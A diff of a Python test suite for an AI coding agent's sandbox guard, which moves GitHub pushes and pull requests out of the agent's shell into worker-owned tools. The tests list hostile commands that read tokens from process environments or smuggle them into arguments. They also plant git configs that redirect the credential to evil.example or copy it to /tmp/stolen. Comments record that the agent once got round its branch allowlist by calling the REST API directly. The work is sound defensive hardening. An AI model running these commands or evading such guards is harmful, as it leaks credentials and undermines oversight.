@@ -13,6 +13,7 @@ import re
 import subprocess
 from pathlib import Path
 
+import httpx
 import numpy as np
 import pytest
 from PIL import Image
@@ -33,7 +34,7 @@ from paratrooper.agent.hooks import (
     make_file_guard_hook,
     make_main_guard_hook,
 )
-from paratrooper.agent.siterepo import SiteRepo
+from paratrooper.agent.siterepo import GitError, SiteRepo
 from paratrooper.agent.tools import ToolContext, build_tool_server
 
 # --- hooks (3.2b): the main/merge boundary -----------------------------------
@@ -83,6 +84,20 @@ from paratrooper.agent.tools import ToolContext, build_tool_server
         "git push -u origin feature/x",
         "git push origin --delete develop",
         "git push",  # no refspec: implicit upstream could be anything
+        # every git subcommand that opens a connection, whatever it names:
+        # the shell holds no credential, so none of these can work
+        "git push origin paratrooper/twen-new-band",
+        "git push -u origin paratrooper/twen-new-photo",
+        "git push --set-upstream origin paratrooper/foo:paratrooper/foo",
+        "git push origin HEAD:refs/heads/paratrooper/foo",
+        "git push origin --delete paratrooper/stale-attempt",
+        "git fetch origin",
+        "git fetch origin main",
+        "git pull origin main",
+        "git clone https://github.com/o/r.git",
+        "git ls-remote origin",
+        'bash -c "git push origin paratrooper/x"',  # nested -> regex backstop
+        "git checkout -B paratrooper/x && git push origin paratrooper/x",  # compound
         # git branch delete/rename outside the prefix
         "git branch -D develop",
         "git branch -m paratrooper/keep renamed",  # rename away from the prefix
@@ -96,38 +111,29 @@ def test_git_violation_denies(command):
 @pytest.mark.parametrize(
     "command",
     [
-        "git push origin paratrooper/twen-new-band",
-        "git push --set-upstream origin paratrooper/foo",
         "git add -A && git commit -m 'add pin'",
         "git checkout -b paratrooper/foo",
         "npm run build",
         "ls -la && cat index.json",
         "git status",
         "git log --oneline -5",
-        "git push --set-upstream origin paratrooper/foo:paratrooper/foo",
-        "git push origin HEAD:refs/heads/paratrooper/foo",  # full ref, feature dest
-        "git fetch origin",
-        "git fetch origin main",
         "git switch paratrooper/foo",
+        "git remote -v",  # reading the remote's name is not reaching it
+        "git diff --stat",
         "git switch -c paratrooper/foo",
         "git checkout .",  # pathspec, not a branch: file restore stays allowed
         "git branch -m paratrooper/old paratrooper/new",  # rename inside the prefix
         "git branch --list",  # listing/query forms never touch a branch
-        # the prompt-driven workflow: the agent's own branch/push/PR commands
+        # the prompt-driven workflow: what is left of it in the shell, which is
+        # all of the local work. The worker fetches and pushes for the agent now.
         "git checkout -B main origin/main",  # reset local default to origin tip
         "git checkout -B paratrooper/twen-new-photo origin/paratrooper/twen-new-photo",
-        "git push -u origin paratrooper/twen-new-photo",
-        "gh pr list --json title,headRefName,url",
-        'gh pr create --title "add twen pin" --body "adds the new twen photo"',
-        "gh pr view 7 --json url",
-        # step 1c's interrupted-attempt sweep: feature-branch cleanup, local + remote
+        # step 1c's interrupted-attempt sweep: local feature-branch cleanup
         "git checkout -- .",
         "git clean -fd",
         "git branch -D paratrooper/stale-attempt",
-        "git push origin --delete paratrooper/stale-attempt",
         # the fresh-fork chain, compounded the way the agent actually runs it
-        "git fetch origin main && git checkout -B main origin/main"
-        " && git checkout -B paratrooper/twen-new-photo",
+        "git checkout -B main origin/main && git checkout -B paratrooper/twen-new-photo",
         "git checkout -- . && git clean -fd",
     ],
 )
@@ -136,13 +142,13 @@ def test_git_violation_allows(command):
 
 
 def test_git_violation_respects_default_branch_name():
-    # the carve-out and the push rules follow whatever the default branch is
-    # named; the paratrooper/* allowlist holds regardless
+    # the carve-out follows whatever the default branch is named; the
+    # paratrooper/* allowlist holds regardless, and no push is allowed at all
     assert git_violation("git push origin trunk", "trunk") is not None
-    assert git_violation("git push origin main", "trunk") is not None  # not paratrooper/*
-    assert git_violation("git push origin paratrooper/x", "trunk") is None
+    assert git_violation("git push origin paratrooper/x", "trunk") is not None
     assert git_violation("git checkout -B trunk origin/trunk", "trunk") is None  # carve-out
     assert git_violation("git checkout -B main origin/main", "trunk") is not None
+    assert git_violation("git checkout -B trunk/x", "trunk") is not None
 
 
 def test_hook_returns_deny_shape():
@@ -340,11 +346,12 @@ def test_branch_cap_skipped_without_repo_root():
     assert _call_hook(hook, "git checkout -B paratrooper/anything") == {}
 
 
-# --- the one road to GitHub: git, and the gh pull-request commands ------------
+# --- no road to GitHub from the shell at all (checklist 2.1) ------------------
 #
-# The session env hands the shell a live GitHub token, so anything that can
-# speak HTTP is an authorised API client. The branch allowlist never saw those
-# commands (they aren't git), which is how PRs ended up being opened by raw REST.
+# The session env used to hand the shell a live GitHub token, so anything that
+# could speak HTTP was an authorised API client. It carries none now: pushing
+# and pull requests are worker-owned tools. Every refusal below has to name
+# those tools, because a denial the agent cannot act on is one it routes around.
 
 _GITHUB_DENIED = [
     # --- reaching a GitHub host with something that isn't git or gh ---
@@ -381,7 +388,23 @@ _GITHUB_DENIED = [
     "tr -d '\\0' < /proc/1/environ",
     """python -c "print(open('/proc/self/environ').read())" """,
     'gh pr create --title x --body "$(printenv GH_TOKEN)"',  # substitution
-    # --- gh outside its pull-request allowlist ---
+    # --- git, wherever it would open a connection ---
+    "git push -u origin paratrooper/x",
+    "git push origin --delete paratrooper/stale",
+    "git fetch origin",
+    "git pull",
+    "git clone https://github.com/o/r.git /tmp/r",
+    "git ls-remote origin",
+    # --- gh, which is neither allowed nor installed any more ---
+    "gh",
+    "gh pr list --json title,headRefName,url",
+    "gh pr view 7",
+    'gh pr create --title x --body y',
+    "gh pr status",
+    "gh pr checks",
+    "gh auth status",
+    "gh --version",
+    "gh help",
     "gh api repos/o/r/pulls",
     "gh api --method POST repos/o/r/pulls -f title=x",
     "gh pr merge 5",
@@ -407,29 +430,22 @@ def test_github_roads_other_than_git_and_gh_are_denied(command):
 @pytest.mark.parametrize("command", _GITHUB_DENIED)
 def test_github_denials_name_the_sanctioned_route(command):
     """A denial the agent can't act on is one it will try to route around, so
-    every refusal has to point at the way through."""
+    every refusal has to point at the way through — which is now three tools,
+    not a command."""
     reason = git_violation(command, "main")
-    assert "gh pr create" in reason, reason
-    assert "gh pr list" in reason, reason
+    for tool_name in ("push_branch", "open_pull_request", "list_pull_requests"):
+        assert tool_name in reason, reason
 
 
 @pytest.mark.parametrize(
     "command",
     [
-        # the gh commands the prompt's workflow actually runs
-        "gh pr list --json title,headRefName,url",
-        "gh pr view 7 --json url",
-        'gh pr create --title "add twen pin" --body "adds the new twen photo"',
-        "gh pr status",
-        "gh pr checks",
-        "gh auth status",
-        "gh --version",
-        "gh version",
-        "gh help",
-        # git, fenced as before
-        "git fetch origin main",
-        "git push -u origin paratrooper/twen-new-photo",
+        # git, for the local work that is all the shell has left
         "git checkout -B paratrooper/twen-new-photo",
+        "git add -A",
+        'git commit -m "add the twen pin"',
+        "git status --short",
+        "git log --oneline -5",
         # HTTP to anything that isn't GitHub stays open: the Astro dev server,
         # an image the user linked, a health check
         "curl -s http://localhost:4321/",
@@ -449,12 +465,15 @@ def test_the_sanctioned_routes_stay_open(command):
     assert git_violation(command, "main") is None
 
 
-def test_gh_denial_names_what_gh_may_still_run():
-    """`gh` is now an allowlist, so the refusal has to spell the allowlist out —
-    the agent has no other way to learn which gh commands survived."""
-    reason = git_violation("gh repo delete o/r", "main")
-    for allowed in ("gh pr list", "gh pr view", "gh pr create", "gh auth status"):
-        assert allowed in reason, reason
+def test_gh_is_refused_whatever_follows_it():
+    """`gh` was an allowlist of pull-request commands while the shell held a
+    token. It holds none and the binary is out of the image, so every spelling
+    gets the same answer, and the answer says why and what to use instead."""
+    for command in ("gh repo delete o/r", "gh pr list", "gh --version", "gh"):
+        reason = git_violation(command, "main")
+        assert reason is not None, command
+        assert "no gh command is allowed" in reason, reason
+        assert "push_branch" in reason, reason
 
 
 def test_a_leading_assignment_does_not_hide_the_command():
@@ -467,11 +486,13 @@ def test_a_leading_assignment_does_not_hide_the_command():
         "GIT_ASKPASS=/tmp/x git push origin main",
         "FOO=bar gh api repos/o/r",
         "HOST=api.github.com",  # an assignment on its own still names the host
+        "FOO=bar git push origin paratrooper/x",  # the namespace is no exemption
+        "FOO=bar gh pr list",
     ):
         assert git_violation(command, "main") is not None, command
     for command in (
-        "FOO=bar git push origin paratrooper/x",
-        "FOO=bar gh pr list",
+        "FOO=bar git checkout -b paratrooper/x",
+        "FOO=bar git commit -m x",
         "NODE_ENV=production npm run build",
     ):
         assert git_violation(command, "main") is None, command
@@ -483,20 +504,21 @@ def test_a_leading_assignment_does_not_hide_the_command():
 
 def test_github_fence_leaves_the_branch_prefix_alone():
     """The GitHub rules and the configured-namespace rules are independent: the
-    new fence must not shift what counts as an agent branch."""
-    assert git_violation("git push -u origin blimp/x", "main", "blimp") is None
-    assert git_violation("gh pr create --title x --body y", "main", "blimp") is None
+    fence must not shift what counts as an agent branch."""
+    assert git_violation("git checkout -B blimp/x", "main", "blimp") is None
+    assert git_violation("git branch -D blimp/x", "main", "blimp") is None
     assert git_violation("curl https://api.github.com", "main", "blimp") is not None
 
 
-def test_worker_image_installs_the_github_cli():
-    """The fence sends every PR through `gh`, so the worker image has to carry
-    it — installed from GitHub's own signed apt repository, not a loose binary."""
+def test_worker_image_no_longer_carries_the_github_cli():
+    """`gh` was the sanctioned road while the shell held a token. It holds none,
+    so a GitHub client on the PATH is only something for an injected instruction
+    to reach for: the package, its apt source and its keyring all come out."""
     dockerfile = (Path(__file__).resolve().parents[1] / "Dockerfile.worker").read_text()
-    assert "https://cli.github.com/packages/githubcli-archive-keyring.gpg" in dockerfile
-    assert "/etc/apt/keyrings/githubcli-archive-keyring.gpg" in dockerfile
-    assert "https://cli.github.com/packages stable main" in dockerfile
-    assert re.search(r"apt-get install[^\n]*\bgh\b", dockerfile)
+    assert "cli.github.com" not in dockerfile
+    assert "githubcli-archive-keyring" not in dockerfile
+    assert not re.search(r"apt-get install[^\n]*\bgh\b", dockerfile)
+    assert re.search(r"apt-get install[^\n]*\bnodejs\b", dockerfile)  # the site build stays
     assert "rm -rf /var/lib/apt/lists/*" in dockerfile  # the layer still cleans up
 
 
@@ -509,23 +531,19 @@ def test_git_violation_fences_the_configured_prefix():
     for command in (
         "git checkout -B blimp/twen-new-photo",
         "git switch -c blimp/x",
-        "git push -u origin blimp/x",
-        "git push origin HEAD:refs/heads/blimp/x",
         "git branch -D blimp/stale",
-        "git push origin --delete blimp/stale",
         "git branch -m blimp/old blimp/new",
     ):
         assert git_violation(command, "main", "blimp") is None, command
     for command in (
         "git checkout -B paratrooper/x",
         "git switch -c paratrooper/x",
-        "git push -u origin paratrooper/x",
         "git branch -D paratrooper/x",
         "git checkout paratrooper/x",
     ):
         assert git_violation(command, "main", "blimp") is not None, command
-    # the default-branch and merge rules don't move with the prefix
-    assert git_violation("git push origin main", "main", "blimp") is not None
+    # the default-branch, merge and connection rules don't move with the prefix
+    assert git_violation("git push origin blimp/x", "main", "blimp") is not None
     assert git_violation("git merge blimp/x", "main", "blimp") is not None
     assert git_violation("git checkout -B main origin/main", "main", "blimp") is None
 
@@ -536,8 +554,6 @@ def test_violation_messages_name_the_configured_prefix():
     for command in (
         "git checkout -B feature/x",
         "git checkout feature/x",
-        "git push origin feature/x",
-        "git push origin",
         "git branch -D feature/x",
         "git branch feature/x",
     ):
@@ -560,7 +576,6 @@ def test_omitted_prefix_is_exactly_the_default():
     was, verdict and wording alike."""
     for command in (
         "git checkout -B paratrooper/x", "git checkout -B feature/x",
-        "git push -u origin paratrooper/x", "git push origin main",
         "git branch -D paratrooper/x", "git branch -D feature/x",
         "git checkout -B main origin/main", "git status",
     ):
@@ -604,7 +619,10 @@ def test_prompt_first_look_sweeps_interrupted_leftovers():
     assert "`git checkout -- .`" in SYSTEM_PROMPT  # dirty tree: discard
     assert "`git clean -fd`" in SYSTEM_PROMPT
     assert "`git branch -D <branch>`" in SYSTEM_PROMPT  # stray local branch
-    assert "`git push origin --delete <branch>`" in SYSTEM_PROMPT  # pushed, no PR
+    # the remote half of that sweep is gone with the credential: the agent
+    # cannot delete a branch on GitHub, and the prompt must not ask it to try
+    assert "git push origin --delete" not in SYSTEM_PROMPT
+    assert "not yours to tidy" in SYSTEM_PROMPT
     assert "never clean up" in SYSTEM_PROMPT  # the open PR's branch is spared
 
 
@@ -642,30 +660,35 @@ def test_default_system_prompt_is_unchanged():
 
 # --- the prompt's GitHub route -----------------------------------------------
 
-# the one paragraph added when gh went into the worker image and the guard
-# closed every other road; quoted here so the test can subtract it
+# the paragraph that says the shell has no road to GitHub at all; quoted here
+# so the test can subtract it
 _GITHUB_RULE = (
-    "GITHUB IS REACHABLE ONLY THROUGH git AND `gh`. Open a pull request with "
-    "`gh pr create` and look at pull requests with `gh pr list` / `gh pr view` — "
-    "never call the GitHub API yourself: no `gh api`, no curl or wget, no Python "
-    "or Node request to github.com or api.github.com, and never read the token "
-    "out of the environment. The shell refuses all of those, so going around "
-    "`gh` only costs you a turn."
+    "GITHUB IS REACHABLE ONLY THROUGH `push_branch`, `open_pull_request` AND "
+    "`list_pull_requests`. Your shell holds no GitHub credential of any kind, so "
+    "nothing in it can reach github.com or api.github.com: not `git push`, not "
+    "`git fetch`, not curl or wget, not a Python or Node request, and `gh` is not "
+    "installed. Every one of those is refused before it runs, so going around the "
+    "tools only costs you a turn. The worker does the pushing and the pull request "
+    "for you, with a credential you never see and must never go looking for."
 )
 
 
-def test_system_prompt_forbids_calling_the_github_api_directly():
-    """The guard refuses a raw API call, but a refusal the agent never expected
-    costs it a turn — the instruction has to say so up front, and name the tool
-    that does work."""
+def test_system_prompt_sends_every_github_step_through_the_tools():
+    """The guard refuses a push or a `gh` line, but a refusal the agent never
+    expected costs it a turn — the instruction has to say so up front, and name
+    the three tools that do work. And no instruction anywhere may still tell it
+    to run a command that cannot work."""
     from paratrooper.agent.prompt import SYSTEM_PROMPT
 
     assert _GITHUB_RULE in SYSTEM_PROMPT
-    assert "`gh api`" in SYSTEM_PROMPT
     assert "api.github.com" in SYSTEM_PROMPT
-    # the gh commands it IS told to use are still the ones the guard allows
-    assert "`gh pr list --json title,headRefName,url`" in SYSTEM_PROMPT
-    assert 'gh pr create --title "..." --body "..."' in SYSTEM_PROMPT
+    for tool_name in ("push_branch", "open_pull_request", "list_pull_requests"):
+        assert f"`{tool_name}`" in SYSTEM_PROMPT, tool_name
+    # nothing is left telling the agent to reach GitHub itself
+    for gone in ("gh pr ", "gh api", "report_pr", "git push -u", "git fetch"):
+        assert gone not in SYSTEM_PROMPT.replace(
+            "not `git push`, not `git fetch`", ""
+        ), gone
 
 
 def test_system_prompt_adds_only_the_github_rule():
@@ -948,12 +971,16 @@ def test_build_tool_server(tmp_path):
     assert server["name"] == "paratrooper"
     assert "mcp__paratrooper__place_pin" in names
     assert "mcp__paratrooper__move_pin" in names
-    assert "mcp__paratrooper__report_pr" in names
     assert "mcp__paratrooper__post_update" in names
-    # the git tools are gone — the agent runs git/gh through its own shell now
+    # the three handoff tools: the only road to GitHub left anywhere
+    for handoff in ("push_branch", "open_pull_request", "list_pull_requests"):
+        assert f"mcp__paratrooper__{handoff}" in names, handoff
+    # report_pr is absorbed by open_pull_request, which records the PR itself
+    assert "mcp__paratrooper__report_pr" not in names
+    # the old in-process git tools stay gone: local git is the agent's own shell
     for gone in ("start_branch", "git_commit", "git_push", "open_pr"):
         assert f"mcp__paratrooper__{gone}" not in names
-    assert len(names) == 10
+    assert len(names) == 12
 
 
 # --- siterepo (bootstrap) ----------------------------------------------------
@@ -985,6 +1012,237 @@ def test_git_auth_never_embeds_token(tmp_path, monkeypatch):
     assert askpass.exists() and "sekret" not in askpass.read_text()
     assert os.access(askpass, os.X_OK)
     assert calls[1][1] is None and calls[2][1] is None  # config runs env-untouched
+
+
+# --- the worker's own git: where the credential is allowed to go (2.1) -------
+
+def _seed_site_and_remote(tmp_path):
+    """A real checkout with a real bare remote, so the push under test is a
+    push and not a mock of one."""
+    bare = tmp_path / "remote.git"
+    subprocess.run(["git", "init", "--bare", "-b", "main", str(bare)],
+                   check=True, capture_output=True)
+    work = tmp_path / "site"
+    subprocess.run(["git", "clone", str(bare), str(work)], check=True, capture_output=True)
+    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@e",
+           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@e"}
+    (work / "f.txt").write_text("x")
+    for args in (["add", "f.txt"], ["commit", "-m", "seed"],
+                 ["checkout", "-B", "paratrooper/x"]):
+        subprocess.run(["git", *args], cwd=work, check=True, capture_output=True, env=env)
+    return bare, work
+
+
+def _remote_branches(bare) -> str:
+    return subprocess.run(
+        ["git", "for-each-ref", "--format=%(refname:short)", "refs/heads/"],
+        cwd=bare, capture_output=True, text=True,
+    ).stdout
+
+
+def test_the_worker_pushes_to_the_configured_repository_not_to_origin(tmp_path):
+    """The push names the configured URL and both ends of the refspec, so
+    nothing about where a credential goes is read out of the checkout. The agent
+    can write .git/config with its file tools — they are outside the CLI's shell
+    sandbox — so "push to origin" would have meant "hand the freshly minted
+    token to whatever host the agent last wrote there"."""
+    bare, work = _seed_site_and_remote(tmp_path)
+    repo = SiteRepo(work, remote=str(bare), github_token="ghs-minted")
+
+    repo.push_branch("paratrooper/x")
+    assert "paratrooper/x" in _remote_branches(bare)
+
+    subprocess.run(["git", "remote", "set-url", "origin",
+                    "https://github.com/attacker/webpage.git"],
+                   cwd=work, check=True, capture_output=True)
+    with pytest.raises(GitError) as err:
+        repo.push_branch("paratrooper/x")
+    assert "attacker" in str(err.value)
+    with pytest.raises(GitError):
+        repo.fetch()
+
+
+def test_the_worker_refuses_a_checkout_that_could_redirect_its_credential(tmp_path):
+    """A URL rewrite, a credential helper or an http.* setting would send the
+    token somewhere else or copy it on the way past, and every one of them is a
+    line the agent can write. They are refused in every config scope, and the
+    refusal names the keys without ever printing their values."""
+    bare, work = _seed_site_and_remote(tmp_path)
+    repo = SiteRepo(work, remote=str(bare), github_token="ghs-minted")
+    for key, value in (
+        ("url.https://evil.example/.insteadOf", "https://github.com/"),
+        ("credential.helper", "!sh -c 'cat > /tmp/stolen'"),
+        ("http.proxy", "http://evil.example:8080"),
+    ):
+        subprocess.run(["git", "config", "--local", key, value], cwd=work,
+                       check=True, capture_output=True)
+        for reach in (lambda: repo.push_branch("paratrooper/x"), repo.fetch):
+            with pytest.raises(GitError) as err:
+                reach()
+            assert key.split(".")[0] in str(err.value)
+            assert value not in str(err.value)  # key names only, never values
+        subprocess.run(["git", "config", "--local", "--unset", key], cwd=work,
+                       check=True, capture_output=True)
+    repo.push_branch("paratrooper/x")  # and it works again once they are gone
+
+
+def test_the_worker_will_not_authenticate_without_a_configured_repository(tmp_path):
+    """No fallback to whatever the checkout calls origin: with nothing
+    configured there is no repository this worker is entitled to push to."""
+    _, work = _seed_site_and_remote(tmp_path)
+    repo = SiteRepo(work, github_token="ghs-minted")
+    with pytest.raises(GitError) as err:
+        repo.push_branch("paratrooper/x")
+    assert "PARATROOPER_REMOTE" in str(err.value)
+
+
+def test_the_askpass_helper_answers_only_for_its_one_host(tmp_path):
+    """git asks whoever the URL points at. The helper used to answer anyone;
+    now it answers one host and exits without a word for every other, so even a
+    redirect that got past the checks above gets nothing out of it."""
+    from paratrooper.agent.siterepo import write_askpass_helper
+
+    helper = write_askpass_helper()
+
+    def ask(prompt, host="github.com"):
+        return subprocess.run(
+            [helper, prompt], capture_output=True, text=True,
+            env={"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
+                 "PARATROOPER_GIT_ASKPASS_HOST": host,
+                 "PARATROOPER_GIT_ASKPASS_TOKEN": "ghs-minted"},
+        )
+
+    answer = ask("Username for 'https://github.com': ")
+    assert answer.returncode == 0 and answer.stdout.strip() == "x-access-token"
+    answer = ask("Password for 'https://x-access-token@github.com': ")
+    assert answer.returncode == 0 and answer.stdout == "ghs-minted"
+
+    for stranger in (
+        "Password for 'https://x-access-token@evil.example': ",
+        "Password for 'https://x-access-token@github.com.evil.example': ",
+        "Username for 'https://github.com.evil.example': ",
+        "Password for 'https://x-access-token@raw.github.com.co': ",
+    ):
+        answer = ask(stranger)
+        assert answer.returncode != 0, stranger
+        assert "ghs-minted" not in answer.stdout, stranger
+    # named no host at all, it answers nobody
+    answer = ask("Password for 'https://x-access-token@github.com': ", host="")
+    assert answer.returncode != 0 and "ghs-minted" not in answer.stdout
+
+
+def test_the_workers_git_runs_on_the_allowlist_not_the_worker_environment(tmp_path):
+    """The push and the fetch are the two git commands a message can trigger, so
+    they get the site build's allowlist rather than the worker's environment:
+    the Claude credential, the queue address and the App key have no business in
+    a git subprocess, and a secret added later must not silently join them."""
+    monkeyed = {"CLAUDE_CODE_OAUTH_TOKEN": "sk-ant", "REDIS_URL": "redis://p@h",
+                "SPOTIFY_CLIENT_SECRET": "s3cret"}
+    saved = {k: os.environ.get(k) for k in monkeyed}
+    os.environ.update(monkeyed)
+    try:
+        repo = SiteRepo(tmp_path, remote="https://github.com/o/r.git", github_token="ghs")
+        env = repo._clean_auth_env("https://github.com/o/r.git")
+    finally:
+        for k, v in saved.items():
+            os.environ.pop(k, None) if v is None else os.environ.__setitem__(k, v)
+    assert set(env) <= {
+        "PATH", "HOME", "LANG", "TMPDIR",
+        "GIT_ASKPASS", "PARATROOPER_GIT_ASKPASS_TOKEN",
+        "PARATROOPER_GIT_ASKPASS_HOST", "GIT_TERMINAL_PROMPT",
+        "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
+    }
+    # the user and system config files are off: one `url.<x>.insteadOf` line in
+    # ~/.gitconfig, which the agent can write, would redirect the explicit URL
+    assert env["GIT_CONFIG_GLOBAL"] == os.devnull
+    assert env["GIT_CONFIG_SYSTEM"] == os.devnull
+    assert env["PARATROOPER_GIT_ASKPASS_HOST"] == "github.com"
+    assert "sk-ant" not in "".join(env.values())
+    assert not [k for k in env if k.startswith(("CLAUDE", "REDIS", "SPOTIFY"))]
+
+
+# --- the worker's pull request calls (2.1) -----------------------------------
+
+def test_owner_repo_reads_every_remote_spelling():
+    from paratrooper.agent.github import GitHubError, owner_repo
+
+    for url in (
+        "https://github.com/AsteroidHunter/webpage.git",
+        "https://github.com/AsteroidHunter/webpage",
+        "https://github.com/AsteroidHunter/webpage/",
+        "git@github.com:AsteroidHunter/webpage.git",
+    ):
+        assert owner_repo(url) == ("AsteroidHunter", "webpage"), url
+    with pytest.raises(GitHubError):
+        owner_repo("/srv/site.git")
+
+
+def test_open_pull_requests_are_narrowed_here_and_not_by_the_api():
+    """The API's head filter takes one exact owner:branch and cannot take a
+    prefix — asking it for 'o:paratrooper/' answers nothing at all, which reads
+    as 'no pending work' and starts a second branch for work already waiting."""
+    from paratrooper.agent.github import open_pull_requests
+
+    seen: list = []
+
+    def handler(request):
+        seen.append(request)
+        return httpx.Response(200, json=[
+            {"number": 7, "title": "a", "html_url": "u7", "head": {"ref": "paratrooper/x"}},
+            {"number": 8, "title": "b", "html_url": "u8", "head": {"ref": "dependabot/y"}},
+        ])
+
+    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
+        entries = open_pull_requests(
+            "o", "r", token="ghs-minted", branch_prefix="paratrooper/", client=client
+        )
+
+    assert entries == [{"number": 7, "branch": "paratrooper/x", "title": "a", "url": "u7"}]
+    request = seen[0]
+    assert request.url.path == "/repos/o/r/pulls"
+    assert request.url.params["state"] == "open"
+    assert "head" not in request.url.params
+    assert request.headers["authorization"] == "Bearer ghs-minted"
+    assert request.headers["x-github-api-version"] == "2022-11-28"
+
+
+def test_create_pull_request_sends_the_branch_and_the_base():
+    from paratrooper.agent.github import create_pull_request
+
+    seen: list = []
+
+    def handler(request):
+        seen.append(json.loads(request.content))
+        return httpx.Response(201, json={
+            "number": 12, "title": "t", "html_url": "u12", "head": {"ref": "paratrooper/x"},
+        })
+
+    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
+        entry = create_pull_request(
+            "o", "r", branch="paratrooper/x", base="main", title="t", body="b",
+            token="ghs-minted", client=client,
+        )
+
+    assert entry == {"number": 12, "branch": "paratrooper/x", "title": "t", "url": "u12"}
+    assert seen[0] == {"title": "t", "body": "b", "head": "paratrooper/x", "base": "main"}
+
+
+def test_a_refused_github_call_raises_with_githubs_own_words():
+    """Every failure is an error to the turn, never a retry with something else:
+    there is no second credential, and a quiet 'it did not work' would leave the
+    change looking pushed when it is not."""
+    from paratrooper.agent.github import GitHubError, create_pull_request, open_pull_requests
+
+    def handler(request):
+        return httpx.Response(401, text='{"message":"Bad credentials"}')
+
+    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
+        with pytest.raises(GitHubError) as err:
+            open_pull_requests("o", "r", token="stale", client=client)
+        assert "401" in str(err.value) and "Bad credentials" in str(err.value)
+        with pytest.raises(GitHubError):
+            create_pull_request("o", "r", branch="paratrooper/x", base="main",
+                                title="t", body="b", token="stale", client=client)
 
 
 def test_ensure_checkout_pins_bot_identity(tmp_path):
@@ -1092,25 +1350,202 @@ def test_edit_tools_run_without_branch(tmp_path):
     assert (cfg.pins_dir / "future" / "index.json").is_file()
 
 
-def test_report_pr_records_url_and_branch(tmp_path):
-    """report_pr is the one seam left between the agent's shell git and the
-    app: the url + branch it records are exactly what the worker's 'pr' event
-    (and so the Publish button) is built from."""
-    ctx = ToolContext(config=_tool_cfg(tmp_path), changelog=memory.Changelog(tmp_path / "cl.jsonl"))
+# --- the handoff tools: the only road to GitHub (checklist 2.1) --------------
+
+REMOTE = "https://github.com/o/r.git"
+
+
+def _payload(out: dict) -> dict:
+    """The JSON a tool answered with."""
+    return json.loads(out["content"][0]["text"])
+
+
+def _handoff_ctx(tmp_path, *, token="ghs-minted"):
+    cfg = _tool_cfg(tmp_path)
+    cfg.remote = REMOTE
+    return ToolContext(
+        config=cfg,
+        changelog=memory.Changelog(tmp_path / "cl.jsonl"),
+        github_token=token,
+    )
+
+
+def _fake_repo(monkeypatch, pushed: list):
+    """Stand in for SiteRepo so the tool's own logic is what is under test."""
+    import paratrooper.agent.tools as tools_mod
+
+    class _Repo:
+        def __init__(self, *args, **kwargs):
+            pass
+
+        def configured_remote(self):
+            return REMOTE
+
+        def push_branch(self, branch):
+            pushed.append(branch)
+
+    monkeypatch.setattr(tools_mod, "SiteRepo", _Repo)
+
+
+def test_push_branch_pushes_only_inside_the_namespace(tmp_path, monkeypatch):
+    """The branch fence moved to where the credential is. The shell's own push
+    is refused outright now, so this refusal is the one that decides what may
+    reach GitHub, and it has to read like the guard's."""
+    pushed: list[str] = []
+    _fake_repo(monkeypatch, pushed)
+    ctx = _handoff_ctx(tmp_path)
     handlers = _tool_handlers(ctx)
 
-    out = asyncio.run(handlers["report_pr"]({
-        "url": "https://github.com/o/r/pull/7", "branch": "paratrooper/twen-new-photo",
-    }))
-    assert not out.get("is_error")
-    assert ctx.last_pr == "https://github.com/o/r/pull/7"
+    out = asyncio.run(handlers["push_branch"]({"branch": "paratrooper/twen-new-photo"}))
+    assert not out.get("is_error"), out
+    assert pushed == ["paratrooper/twen-new-photo"]
+    assert _payload(out)["pushed"] == "paratrooper/twen-new-photo"
+    assert _payload(out)["url"] == "https://github.com/o/r/tree/paratrooper/twen-new-photo"
     assert ctx.branch == "paratrooper/twen-new-photo"
 
-    # missing pieces are loud — a silent no-op here kills the Publish button
-    out = asyncio.run(handlers["report_pr"]({"url": "", "branch": "x"}))
+    for refused in ("main", "feature/x", "paratrooper", "", "paratrooper/"):
+        out = asyncio.run(handlers["push_branch"]({"branch": refused}))
+        assert out.get("is_error"), refused
+    assert pushed == ["paratrooper/twen-new-photo"]  # nothing else was attempted
+
+
+def test_open_pull_request_opens_one_and_records_it(tmp_path, monkeypatch):
+    """Opening the pull request and recording it are the same step now. The
+    Publish button used to depend on the agent remembering a second call."""
+    import paratrooper.agent.tools as tools_mod
+
+    calls: dict = {}
+
+    def fake_find(owner, repo, *, branch, token, client=None):
+        calls["find"] = (owner, repo, branch, token)
+        return None
+
+    def fake_create(owner, repo, **kwargs):
+        calls["create"] = (owner, repo, kwargs)
+        return {"number": 12, "branch": kwargs["branch"], "title": kwargs["title"],
+                "url": "https://github.com/o/r/pull/12"}
+
+    monkeypatch.setattr(tools_mod.github, "find_open_pull_request", fake_find)
+    monkeypatch.setattr(tools_mod.github, "create_pull_request", fake_create)
+    _fake_repo(monkeypatch, [])
+    ctx = _handoff_ctx(tmp_path)
+    handlers = _tool_handlers(ctx)
+
+    out = asyncio.run(handlers["open_pull_request"]({
+        "branch": "paratrooper/twen-new-photo", "title": "Add the twen photo", "body": "b",
+    }))
+    assert not out.get("is_error"), out
+    assert _payload(out)["number"] == 12
+    assert _payload(out)["existing"] is False
+    assert ctx.last_pr == "https://github.com/o/r/pull/12"
+    assert ctx.branch == "paratrooper/twen-new-photo"
+    assert calls["find"] == ("o", "r", "paratrooper/twen-new-photo", "ghs-minted")
+    owner, repo, kwargs = calls["create"]
+    assert (owner, repo) == ("o", "r")
+    assert kwargs["base"] == "main"  # always the configured default branch
+    assert kwargs["token"] == "ghs-minted"
+
+
+def test_open_pull_request_hands_back_the_one_already_open(tmp_path, monkeypatch):
+    """A second push to a branch that already has a pull request must not try to
+    open another (GitHub refuses it) and must still light the Publish button."""
+    import paratrooper.agent.tools as tools_mod
+
+    def fake_find(owner, repo, *, branch, token, client=None):
+        return {"number": 7, "branch": branch, "title": "t",
+                "url": "https://github.com/o/r/pull/7"}
+
+    def boom(*args, **kwargs):
+        raise AssertionError("a second pull request must never be opened")
+
+    monkeypatch.setattr(tools_mod.github, "find_open_pull_request", fake_find)
+    monkeypatch.setattr(tools_mod.github, "create_pull_request", boom)
+    _fake_repo(monkeypatch, [])
+    ctx = _handoff_ctx(tmp_path)
+    handlers = _tool_handlers(ctx)
+
+    out = asyncio.run(handlers["open_pull_request"]({
+        "branch": "paratrooper/twen-new-photo", "title": "t", "body": "b",
+    }))
